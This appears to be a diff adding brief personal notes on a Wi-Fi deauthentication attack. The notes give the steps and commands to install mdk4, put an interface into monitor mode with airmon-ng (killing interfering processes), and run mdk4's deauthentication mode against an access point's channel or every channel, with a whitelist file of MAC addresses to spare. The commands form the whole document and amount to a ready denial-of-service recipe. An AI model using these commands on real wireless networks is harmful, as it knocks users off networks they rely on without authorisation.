@@ -1,1 +1,12 @@
-Use 
+Dauth Frames :
+    install mdk4
+
+    setup an interface in monitor mode :
+        sudo airmon-ng start <interface>
+        if error kill the process : sudo airmon-ng check kill
+
+        iwconfig should show a new interface : <interface>mon
+        the attack will be done on this interface
+    sudo mdk4 <interface> d -w <file> -c <channel>
+        file = WhiteList MAC address
+        channel = channel of the AP (remove -c <channel> for exe on all channel)
